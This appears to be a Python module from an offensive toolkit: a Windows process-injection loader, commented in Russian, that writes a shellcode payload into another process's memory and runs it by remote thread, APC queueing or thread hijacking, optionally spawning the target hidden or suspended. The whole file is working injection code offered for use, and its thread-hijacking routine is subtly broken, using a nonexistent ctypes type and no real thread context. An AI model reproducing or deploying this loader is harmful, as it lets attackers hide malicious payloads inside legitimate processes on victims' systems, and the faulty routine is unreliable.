import os
import ctypes
import time
import random
from typing import List, Dict, Any, Union, Optional, Tuple

from core.interfaces import BaseLoader


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong)
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_void_p),
        ("lpDesktop", ctypes.c_void_p),
        ("lpTitle", ctypes.c_void_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p)
    ]


PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000


class ProcessInjectionLoader(BaseLoader):
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
    
    def load(self, payload: bytes, target_process: str = None, **kwargs) -> bool:
        technique = kwargs.get("technique", "classic")
        create_suspended = kwargs.get("create_suspended", False)
        hide_process = kwargs.get("hide_process", False)
        process_id = None
        
        if target_process and target_process.isdigit():
            process_id = int(target_process)
        
        if not target_process and not process_id:
            target_process = "notepad.exe"
        
        if technique == "classic":
            return self._classic_injection(payload, target_process, process_id, create_suspended, hide_process)
        elif technique == "apc":
            return self._apc_injection(payload, target_process, process_id, create_suspended)
        elif technique == "thread_hijacking":
            return self._thread_hijacking(payload, target_process, process_id)
        else:
            raise ValueError(f"Неизвестная техника внедрения кода: {technique}")
    
    def _find_process_by_name(self, process_name):
        import psutil
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    return proc.info['pid']
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        return None
    
    def _create_process(self, process_name, create_suspended=False):
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        si.dwFlags = 0x1  # STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        
        pi = PROCESS_INFORMATION()
        
        creation_flags = 0x4 if create_suspended else 0  # CREATE_SUSPENDED = 0x4
        
        if not self.kernel32.CreateProcessA(
            None,
            process_name.encode('utf-8'),
            None,
            None,
            False,
            creation_flags,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        ):
            return None
        
        return pi
    
    def _hide_process(self, process_id):
        try:
            import psutil
            p = psutil.Process(process_id)
            p.nice(psutil.IDLE_PRIORITY_CLASS)
            return True
        except:
            return False
    
    def _classic_injection(self, payload, target_process=None, process_id=None, create_suspended=False, hide_process=False):
        if not process_id and target_process:
            process_id = self._find_process_by_name(target_process)
        
        if not process_id:
            if not target_process:
                raise ValueError("Не указан процесс для внедрения кода")
            
            pi = self._create_process(target_process, create_suspended)
            if not pi:
                raise ValueError(f"Не удалось создать процесс {target_process}")
            
            process_id = pi.dwProcessId
            process_handle = pi.hProcess
        else:
            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            
            if not process_handle:
                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
        
        if hide_process and process_id:
            self._hide_process(process_id)
        
        try:
            # Выделяем память в целевом процессе
            remote_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                0,
                len(payload),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                raise ValueError("Не удалось выделить память в целевом процессе")
            
            # Записываем шелл-код в выделенную память
            bytes_written = ctypes.c_ulong(0)
            result = self.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                payload,
                len(payload),
                ctypes.byref(bytes_written)
            )
            
            if not result or bytes_written.value != len(payload):
                raise ValueError("Не удалось записать шелл-код в память процесса")
            
            # Создаем удаленный поток для выполнения шелл-кода
            thread_handle = self.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                remote_memory,
                None,
                0,
                None
            )
            
            if not thread_handle:
                raise ValueError("Не удалось создать удаленный поток")
            
            # Ждем завершения потока или возвращаем управление сразу
            if create_suspended:
                self.kernel32.ResumeThread(thread_handle)
            
            # Закрываем хендлы
            self.kernel32.CloseHandle(thread_handle)
            self.kernel32.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            self.kernel32.CloseHandle(process_handle)
            raise e
    
    def _apc_injection(self, payload, target_process=None, process_id=None, create_suspended=False):
        if not process_id and target_process:
            process_id = self._find_process_by_name(target_process)
        
        if not process_id:
            if not target_process:
                raise ValueError("Не указан процесс для внедрения кода")
            
            pi = self._create_process(target_process, True)  # Всегда создаем в приостановленном режиме
            if not pi:
                raise ValueError(f"Не удалось создать процесс {target_process}")
            
            process_id = pi.dwProcessId
            process_handle = pi.hProcess
            thread_handle = pi.hThread
        else:
            import psutil
            
            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            
            if not process_handle:
                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
            
            # Получаем дескриптор потока
            threads = []
            try:
                p = psutil.Process(process_id)
                threads = p.threads()
            except:
                pass
            
            if not threads:
                raise ValueError(f"Не найдены потоки для процесса с ID {process_id}")
            
            # Используем первый поток
            thread_id = threads[0].id
            thread_handle = self.kernel32.OpenThread(0x1FFFFF, False, thread_id)
            
            if not thread_handle:
                raise ValueError(f"Не удалось открыть поток с ID {thread_id}")
            
            # Приостанавливаем поток
            self.kernel32.SuspendThread(thread_handle)
        
        try:
            # Выделяем память в целевом процессе
            remote_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                0,
                len(payload),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                raise ValueError("Не удалось выделить память в целевом процессе")
            
            # Записываем шелл-код в выделенную память
            bytes_written = ctypes.c_ulong(0)
            result = self.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                payload,
                len(payload),
                ctypes.byref(bytes_written)
            )
            
            if not result or bytes_written.value != len(payload):
                raise ValueError("Не удалось записать шелл-код в память процесса")
            
            # Добавляем APC запрос в очередь APC целевого потока
            result = self.kernel32.QueueUserAPC(
                remote_memory,
                thread_handle,
                0
            )
            
            if not result:
                raise ValueError("Не удалось добавить APC запрос")
            
            # Возобновляем поток
            self.kernel32.ResumeThread(thread_handle)
            
            # Закрываем хендлы
            self.kernel32.CloseHandle(thread_handle)
            self.kernel32.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            if thread_handle:
                self.kernel32.ResumeThread(thread_handle)
                self.kernel32.CloseHandle(thread_handle)
            if process_handle:
                self.kernel32.CloseHandle(process_handle)
            raise e
    
    def _thread_hijacking(self, payload, target_process=None, process_id=None):
        if not process_id and target_process:
            process_id = self._find_process_by_name(target_process)
        
        if not process_id:
            if not target_process:
                raise ValueError("Не указан процесс для внедрения кода")
            
            pi = self._create_process(target_process, True)  # Всегда создаем в приостановленном режиме
            if not pi:
                raise ValueError(f"Не удалось создать процесс {target_process}")
            
            process_id = pi.dwProcessId
            process_handle = pi.hProcess
            thread_handle = pi.hThread
            thread_id = pi.dwThreadId
        else:
            import psutil
            
            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            
            if not process_handle:
                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
            
            # Получаем дескриптор потока
            threads = []
            try:
                p = psutil.Process(process_id)
                threads = p.threads()
            except:
                pass
            
            if not threads:
                raise ValueError(f"Не найдены потоки для процесса с ID {process_id}")
            
            # Используем первый поток
            thread_id = threads[0].id
            thread_handle = self.kernel32.OpenThread(0x1FFFFF, False, thread_id)
            
            if not thread_handle:
                raise ValueError(f"Не удалось открыть поток с ID {thread_id}")
            
            # Приостанавливаем поток
            self.kernel32.SuspendThread(thread_handle)
        
        try:
            # Получаем контекст потока
            context = ctypes.c_ulong64()
            context.value = 0
            
            CONTEXT_FULL = 0x10000F
            if not self.kernel32.GetThreadContext(thread_handle, ctypes.byref(context)):
                raise ValueError("Не удалось получить контекст потока")
            
            # Выделяем память в целевом процессе
            remote_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                0,
                len(payload),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                raise ValueError("Не удалось выделить память в целевом процессе")
            
            # Записываем шелл-код в выделенную память
            bytes_written = ctypes.c_ulong(0)
            result = self.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                payload,
                len(payload),
                ctypes.byref(bytes_written)
            )
            
            if not result or bytes_written.value != len(payload):
                raise ValueError("Не удалось записать шелл-код в память процесса")
            
            # Изменяем контекст потока, чтобы он указывал на наш шелл-код
            # Здесь нужно учитывать архитектуру процесса (x86 или x64)
            # В этом примере предполагаем, что x64
            context.rip = remote_memory
            
            if not self.kernel32.SetThreadContext(thread_handle, ctypes.byref(context)):
                raise ValueError("Не удалось изменить контекст потока")
            
            # Возобновляем поток
            self.kernel32.ResumeThread(thread_handle)
            
            # Закрываем хендлы
            self.kernel32.CloseHandle(thread_handle)
            self.kernel32.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            if thread_handle:
                self.kernel32.ResumeThread(thread_handle)
                self.kernel32.CloseHandle(thread_handle)
            if process_handle:
                self.kernel32.CloseHandle(process_handle)
            raise e

    def supported_platforms(self) -> List[str]:
        return ["windows"]